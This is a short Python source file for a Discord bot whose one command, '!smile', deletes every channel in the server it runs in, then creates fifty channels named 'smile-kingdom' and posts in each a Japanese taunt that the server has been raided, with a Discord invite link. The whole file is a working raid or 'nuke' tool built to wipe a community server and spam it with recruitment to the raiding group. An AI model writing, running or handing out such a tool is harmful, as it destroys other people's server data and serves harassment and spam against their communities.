import discord
from discord.ext import commands
import asyncio

bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")

@bot.command()
async def smile(ctx):
    guild = ctx.guild
    await ctx.send("作戦開始")
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass
    for i in range(50):
        try:
            new_ch = await guild.create_text_channel(f"smile-kingdom-{i}")
            await new_ch.send("このサーバーはsmile王国に荒らされましたwww 今すぐsmile王国に参加！ https://discord.gg/mFbzWhB8Z7")
        except:
            pass
    await ctx.send("完了")

bot.run("YOUR_BOT_TOKEN")
